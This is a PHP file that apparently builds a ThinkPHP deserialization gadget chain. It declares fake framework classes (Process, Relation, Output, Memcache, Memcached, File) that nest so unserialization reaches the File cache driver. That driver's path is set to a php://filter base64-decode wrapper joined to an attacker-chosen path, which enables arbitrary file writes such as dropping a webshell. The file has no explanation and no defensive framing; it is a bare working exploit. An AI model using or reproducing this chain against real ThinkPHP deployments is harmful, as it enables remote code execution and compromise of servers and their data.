<?php
namespace think;


class Process
{
    private $processPipes;

    private $status;

    private $processInformation;
    public function  __construct($path,$data){
        $this->processInformation['running']=true;
        $this->status=3;
        $this->processPipes=new \think\model\Relation($path,$data);
    }

}
namespace think\model;

use think\console\Output;

class Relation
{
    protected $query;
    const HAS_ONE          = 1;
    const HAS_MANY         = 2;
    const HAS_MANY_THROUGH = 5;
    const BELONGS_TO       = 3;
    const BELONGS_TO_MANY  = 4;
    protected $type=2;
    protected $where;
    public function __construct($path,$data)
    {
        $this->where='AAA'.$data;
        $this->query=new Output($path);
    }
}


namespace think\console;
class Output{
    protected $styles = [
        'info',
        'error',
        'comment',
        'question',
        'highlight',
        'warning',
        'getTable',
        'where'
    ];
    private $handle;
    public function __construct($path)
    {
        $this->handle = (new \think\session\driver\Memcache($path));
    }
}
namespace think\session\driver;
class Memcache
{
    protected $handler;
    public function __construct($path)
    {
        $this->handler = (new \think\cache\driver\Memcached($path));
    }
}


namespace think\cache\driver;

class Memcached
{
    protected $tag;
    protected $options;
    protected $handler;

    public function __construct($path)
    {
        $this->tag = true;
        $this->options = [
            'expire'   => 0,
            'prefix'   => '',
        ];
        $this->handler = (new File($path));
    }
}

class File
{
    protected $tag;
    protected $options;
    public function __construct($path)
    {
        $this->tag = false;
        $this->options = [
            'expire'        => 3600,
            'cache_subdir'  => false,
            'prefix'        => '',
            'data_compress' => false,
            'path'          => 'php://filter/convert.base64-decode/resource='.$path,
        ];
    }
}